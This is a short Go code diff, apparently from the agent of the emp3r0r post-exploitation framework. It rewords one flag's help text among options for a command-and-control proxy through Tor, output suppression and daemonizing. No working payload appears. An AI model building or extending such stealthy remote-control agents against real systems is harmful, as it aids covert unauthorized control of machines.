@@ -16,7 +16,7 @@ import (
 
 func main() {
 	c2proxy := flag.String("proxy", "socks5://127.0.0.1:9050", "Proxy for emp3r0r agent's C2 communication")
-	silent := flag.Bool("silent", false, "Show logs or not")
+	silent := flag.Bool("silent", false, "Suppress output")
 	daemon := flag.Bool("daemon", false, "Daemonize")
 	flag.Parse()
 
